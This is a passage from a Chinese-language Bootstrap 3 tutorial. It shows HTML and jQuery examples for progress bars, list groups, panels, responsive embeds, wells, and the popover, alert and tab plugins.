</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-info"</span> <span class="attr">style</span>=<span class="string">"width:60%;"</span>&gt;</span>60%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-success"</span> <span class="attr">style</span>=<span class="string">"width:25%;"</span>&gt;</span>25%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-danger"</span> <span class="attr">style</span>=<span class="string">"width:45%;"</span>&gt;</span>45%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-warning"</span> <span class="attr">style</span>=<span class="string">"width:45%;"</span>&gt;</span>45%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>条纹的进度条 <code>progress-striped</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress progress-striped"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar"</span> <span class="attr">style</span>=<span class="string">"width:45%;"</span>&gt;</span>45%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>动画的进度条<code>active</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress progress-striped active"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar"</span> <span class="attr">style</span>=<span class="string">"width:45%;"</span>&gt;</span>45%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>堆叠的进度条</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-warning"</span> <span class="attr">style</span>=<span class="string">"width:45%;"</span>&gt;</span>45%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"progress-bar progress-bar-success"</span> <span class="attr">style</span>=<span class="string">"width:25%;"</span>&gt;</span>25%<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>媒体对象</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"media"</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"pull-left"</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"media-object"</span> <span class="attr">src</span>=<span class="string">"images/kittens.jpg"</span> <span class="attr">alt</span>=<span class="string">""</span> <span class="attr">width</span>=<span class="string">"95"</span>/&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"media-body"</span>&gt;</span></span><br><span class="line">	   <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"media-heading"</span>&gt;</span>媒体标题<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">	   这是一些示例文本。这是一些示例文本。</span><br><span class="line">	   这是一些示例文本。这是一些示例文本。</span><br><span class="line">	   这是一些示例文本。这是一些示例文本。</span><br><span class="line">	   这是一些示例文本。这是一些示例文本。</span><br><span class="line">	   这是一些示例文本。这是一些示例文本。</span><br><span class="line">   <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>列表组</strong></p>
<ul>
<li>向列表组添加国徽</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>免费域名注册 <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"badge pull-right"</span>&gt;</span>20<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>免费 Window 空间托管<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>每年更新成本<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>向列表组添加链接</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"list-group-item active"</span>&gt;</span>免费域名注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>免费 Window 空间托管<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>每年更新成本<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>向列表组添加自定义内容</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>Cras justo odio<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>Dapibus ac facilisis in<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>Morbi leo risus<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>Porta ac consectetur ac<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>Vestibulum at eros<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>面板</strong></p>
<ul>
<li>面板标题</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>面板脚注</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-footer text-right"</span>&gt;</span>by zichen<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>面板主题</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-primary"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-success"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-info"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-warning"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-danger"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>带表格的面板</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-default"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span>Panel heading<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">td</span>&gt;</span>学号<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">td</span>&gt;</span>姓名<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">	  <span class="tag">&lt;<span class="name">td</span>&gt;</span>年龄<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>带列表组的面板</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel panel-danger"</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-heading"</span>&gt;</span>标题<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-body"</span>&gt;</span>面板内容显示区域<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"list-group"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>免费域名注册<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>免费 Window 空间托管<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>图像的数量<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>24*7 支持<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"list-group-item"</span>&gt;</span>每年更新成本<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"panel-footer text-right"</span>&gt;</span>by zichen<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>响应式嵌入组件</strong></p>
<ul>
<li>根据被嵌入内容的外部容器的宽度，自动创建一个固定的比例，从而让浏览器自动确定 内容的尺寸，能够在各种设备上缩放<br />
这些规则可以直接用于<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>、<code>&lt;video&gt;</code>和<code>&lt;object&gt;</code>元素。</li>
<li><code>16:9</code> 响应式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"embed-responsive embed-responsive-16by9"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"https://www.youtube.com/embed/zpOULjyy-n8?rel=0"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>4:3</code> 响应式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"embed-responsive embed-responsive-4by3"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span> <span class="attr">src</span>=<span class="string">"https://www.youtube.com/embed/zpOULjyy-n8?rel=0"</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"embed-responsive embed-responsive-16by9"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">class</span>=<span class="string">"embed-responsive-item"</span> <span class="attr">src</span>=<span class="string">"https://www.youtube.com/embed/zpOULjyy-n8?rel=0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"embed-responsive embed-responsive-4by3"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">iframe</span> <span class="attr">class</span>=<span class="string">"embed-responsive-item"</span> <span class="attr">src</span>=<span class="string">"https://www.youtube.com/embed/zpOULjyy-n8?rel=0"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong><code>well</code></strong></p>
<ul>
<li>基本的<code>well</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"well"</span>&gt;</span>您好，我在大的 Well 中！<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>尺寸大小 <code>well-lg</code>   <code>well-sm</code></li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"well well-lg"</span>&gt;</span>您好，我在大的 Well 中！<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"well well-sm"</span>&gt;</span>您好，我在小的 Well 中！<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="十-弹出框-警告框-标签页和工具提示插件插件"><a class="markdownIt-Anchor" href="#十-弹出框-警告框-标签页和工具提示插件插件"></a> 十、弹出框、警告框、标签页和工具提示插件插件</h4>
<hr />
<p><strong>弹出框</strong></p>
<ul>
<li>弹出框点击一个元素，弹出一个包含标题和内容的容器</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//基本用法</span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-lg btn-danger"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">data-toggle</span>=<span class="string">"popover"</span> <span class="attr">title</span>=<span class="string">"弹出框"</span> <span class="attr">data-content</span>=<span class="string">"这是一个弹出框插件"</span>&gt;</span></span><br><span class="line">	点击弹出/隐藏弹出框</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>JavaScript</code> 初始化  <code>$('button').popover();</code></p>
</li>
<li>
<p><code>Popover</code> 插件中的属性：</p>
<ul>
<li><code>data-animation</code>   默认 <code>true</code>，在 <code>popover</code> 上应用一个 <code>CSS</code> <code>fade</code> 动画。 如果设置 <code>false</code>，则不应用。</li>
<li><code>data-html</code>        默认 <code>false</code>，不允许提示内容格式为 <code>html</code>。如果设置 为 <code>true</code>，则可以设置 <code>html</code> 格式的提示内容</li>
<li><code>data-placement</code>   默认值 <code>top</code>，还有 <code>bottom</code>、<code>left</code>、<code>right</code> 和 <code>auto</code>。 如果<code>auto</code>会自行调整合适的位置，如果是<code>auto</code> <code>left</code> 则会尽量在左边显示，但左边不行就靠右边。</li>
<li><code>data-selector</code>   默认 <code>false</code>，可以选择绑定指定的选择器。</li>
<li><code>data-original-title</code> 默认空字符串，弹出框的标题。优先级比 <code>title</code> 低</li>
<li><code>title</code>          默认字空符串，弹出框的标题。</li>
<li><code>data-trigger</code>     默认值 <code>click</code>，表示怎么触发 <code>popover</code>，其他值为： <code>hover</code>、<code>focus</code>、<code>manual</code>。多个值用空格隔开，manual 手动不能和其他同时设置。</li>
<li><code>data-delay</code>       默认值 <code>0</code>，延迟触发 <code>popover(毫秒)</code>，如果传数字则， 表示 <code>show</code>/<code>hide</code> 的毫秒数，如果传对象，结构为： {show:500,hide:100}</li>
<li><code>data-container</code>   默认值 <code>false</code>，将 <code>popover</code> 附加到特定的元素上。比 如组合按钮组提示，容器不够，可以附加 <code>body</code> 上。<code>container : 'body'</code></li>
<li><code>data-template</code>   更改提示框的 <code>HTML</code> 提示语的模版，默认值为：</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"popover"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"arrow"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">"popover-title"</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"popover-content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>data-content</code>    默认值为空，弹出框的内容。</li>
<li><code>data-viewport</code>    设置外围容器的边际，具体代码看示例。</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"> $(<span class="string">'button'</span>).popover(&#123;</span><br><span class="line">trigger:<span class="string">"click"</span>,</span><br><span class="line">placement:<span class="string">"right"</span>,</span><br><span class="line">viewport : &#123;</span><br><span class="line">	selector : <span class="string">'#view'</span></span><br><span class="line">&#125;</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>Popover</code> 插件中的方法：</p>
<ul>
<li>显示 <code>$('button').popover('show');</code></li>
<li>隐藏 <code>$('button').popover('hide');</code></li>
<li>反转显示和隐藏 <code>$('button').popover('toggle');</code></li>
<li>隐藏并销毁 <code>$('button').popover('destroy');</code></li>
</ul>
</li>
<li>
<p><code>Popover</code> 插件中的事件：</p>
<ul>
<li><code>show.bs.popover</code> 在调用 <code>show</code> 方法时触发</li>
<li><code>shown.bs.popover</code> 在显示整个弹窗时时触发</li>
<li><code>hide.bs.popover</code> 在调用 <code>hide</code> 方法时触发</li>
<li><code>hidden.bs.popover</code> 在完全关闭整个弹出时触发</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'button'</span>).on(<span class="string">'show.bs.tab'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     alert(<span class="string">'调用 show 方法时触发！'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>警告框</strong></p>
<ul>
<li>警告框即为点击小时的信息框</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//基本实例</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"alert alert-warning"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">data-dismiss</span>=<span class="string">"alert"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">span</span>&gt;</span>×<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>警告：您的浏览器不支持！<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>添加淡入淡出效果   <code>&lt;div class=&quot;alert alert-warning fade in&quot;&gt;</code></p>
</li>
<li>
<p>如果用 <code>JavaScript</code>，可以代替 <code>data-dismiss=&quot;alert&quot;</code></p>
</li>
<li>
<p><code>Alert</code> 插件中的方法：</p>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'.close'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     $(<span class="string">'#alert'</span>).alert(<span class="string">'close'</span>);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>Alert</code> 插件中的事件：
<ul>
<li><code>close.bs.alert</code>   当 <code>close</code> 方法被调用后立即触发</li>
<li><code>closed.bs.alert</code>  当警告框被完全关闭后立即触发</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">'#alert'</span>).on(<span class="string">'close.bs.alert'</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">     alert(<span class="string">'当 close 方法被触发时调用！'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><strong>标签页</strong></p>
<ul>
<li>标签页也就是通常所说的选项卡功能</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">//基本用法</span><br><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-tabs"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#html5"</span> <span class="attr">data-toggle</span>=<span class="string">"tab"</span>&gt;</span>HTML5<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#bootstrap"</span> <span class="attr">data-toggle</span>=<span class="string">"tab"</span>&gt;</span>Bootstrap<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#jquery"</span> <span class="attr">data-toggle</span>=<span class="string">"tab"</span>&gt;</span>jQuery<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"#extjs"</span> <span class="attr">data-toggle</span>=<span class="string">"tab"</span>&gt;</span>ExtJS<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab-content"</span> <span class="attr">style</span>=<span class="string">"padding: 10px;"</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab-pane active"</span> <span class="attr">id</span>=<span class="string">"html5"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab-pane"</span> <span class="attr">id</span>=<span class="string">"bootstrap"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab-pane"</span> <span class="attr">id</span>=<span class="string">"jquery"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab-pane"</span> <span class="attr">id</span>=<span class="string">"extjs"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以设置淡入淡出效果 fade，而 in 表示首选的内容默认显示</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"tab-pane fade in active"</span> <span class="attr">id</span>=<span class="string">"html5"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>也可以换成胶囊式</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav nav-pills"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>data-target</code>    使用 <code>data-target</code> 绑定或不绑定效果都是一样的</p>
</li>
<li>
<p><code>Tab</code> 插件中的方法：</p>
</li>
